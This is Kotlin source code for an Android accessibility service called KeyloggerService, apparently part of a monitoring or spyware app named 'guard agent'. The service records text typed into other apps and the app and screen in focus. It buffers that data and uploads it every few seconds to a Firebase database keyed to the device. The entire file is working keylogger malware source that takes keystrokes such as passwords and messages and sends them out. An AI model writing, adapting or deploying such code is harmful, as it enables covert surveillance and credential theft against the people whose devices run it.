package com.guard.agent.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.google.firebase.database.FirebaseDatabase
import com.guard.agent.core.Constants
import com.guard.agent.core.DeviceKey
import com.guard.agent.helpers.data.CurrentAppTracker
import com.guard.agent.utils.Logger

class KeyloggerService : AccessibilityService() {

    private val deviceKey by lazy { DeviceKey.get(this) }
    private val buffer = StringBuilder()
    private var lastPush = 0L

    override fun onServiceConnected() {
        super.onServiceConnected()
        Logger.d("Keylogger", "Service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        event ?: return

        try {
            when (event.eventType) {

                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                    val text = event.text.joinToString("")
                    if (text.isNotBlank()) {
                        buffer.append(text).append(" ")
                        maybePush()
                    }
                }

                AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                    val pkg = event.packageName?.toString() ?: return
                    if (pkg != packageName) {
                        buffer.append("\n[$pkg] ")
                    }
                }

                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                    val pkg = event.packageName?.toString() ?: return
                    val cls = event.className?.toString() ?: ""

                    if (pkg != packageName) {
                        // ⭐ Current app tracker
                        CurrentAppTracker.onAppChanged(this, pkg)

                        // Keylogger buffer mein bhi
                        if (cls.isNotBlank()) {
                            buffer.append("\n>>> $pkg / $cls\n")
                            maybePush()
                        }
                    }
                }
            }
        } catch (e: Exception) {
            Logger.e("Keylogger", "Event error", e)
        }
    }

    private fun maybePush() {
        val now = System.currentTimeMillis()
        if (now - lastPush < 5000L || buffer.length < 20) return
        pushBuffer()
    }

    private fun pushBuffer() {
        if (buffer.isEmpty()) return
        val text = buffer.toString()
        buffer.clear()
        lastPush = System.currentTimeMillis()

        try {
            FirebaseDatabase.getInstance()
                .getReference(Constants.PATH_DEVICES)
                .child(deviceKey).child(Constants.SUB_KEYLOGS).push()
                .setValue(
                    mapOf(
                        "text" to text,
                        "time" to System.currentTimeMillis()
                    )
                )
        } catch (e: Exception) {
            Logger.e("Keylogger", "Push failed", e)
        }
    }

    override fun onInterrupt() {
        Logger.d("Keylogger", "Service interrupted")
    }

    override fun onDestroy() {
        pushBuffer()
        super.onDestroy()
    }
}
